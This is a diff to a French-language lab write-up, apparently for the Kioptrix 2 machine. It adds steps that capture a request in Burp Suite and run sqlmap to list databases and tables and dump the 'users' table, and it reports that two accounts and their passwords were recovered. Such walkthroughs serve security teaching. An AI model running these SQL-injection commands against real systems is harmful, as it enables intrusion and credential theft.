@@ -26,4 +26,27 @@ tout d'abord on intercepte la requête via burp suite.
 <p align="center">
   <img src="https://rajoul.github.io/my_write_up/image/kioptrix_2/burp_suite_3.png" width="860" height="220">
 </p>
-ensuite on récupère toutes les informations sur la requête et les enregistrés dans un fichier burp.txt.et enfin lancer sqlmap.###### >sqlmap -r burp.txt --dbs
+ensuite on récupère toutes les informations sur la requête et les enregistrés dans un fichier burp.txt.et enfin lancer sqlmap.**>sqlmap -r burp.txt --dbs**
+<p align="center">
+  <img src="https://rajoul.github.io/my_write_up/image/kioptrix_2/database_name_5.png" width="860" height="220">
+</p>
+ensuite on récupère les tables du database webapp.**>sqlmap -r burp.txt -D webapp --tables**
+<p align="center">
+  <img src="https://rajoul.github.io/my_write_up/image/kioptrix_2/table_name_6.png" width="860" height="220">
+</p>
+enfin récupèrer les comptes utilisateur.**>sqlmap -r burp.txt -D webapp -T users --dump**
+<p align="center">
+  <img src="https://rajoul.github.io/my_write_up/image/kioptrix_2/get_users_7.png" width="860" height="220">
+</p>
+On a réussi à trouver deux comptes utilisateurs et leurs mots de pass.
+
+
+
+
+
+
+
+
+
+
+
